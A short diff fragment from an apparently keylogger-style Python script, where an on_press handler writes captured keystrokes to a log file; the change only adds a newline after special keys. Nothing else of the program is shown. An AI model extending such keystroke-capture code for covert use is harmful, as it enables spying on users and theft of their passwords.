@@ -17,7 +17,7 @@ def on_press(key):
             elif key == Key.enter:
                 log.write("\n")
             else:
-                log.write(f"\n{key}")
+                log.write(f"\n{key}\n")
 
 '''# Stop log
 def on_release(key):
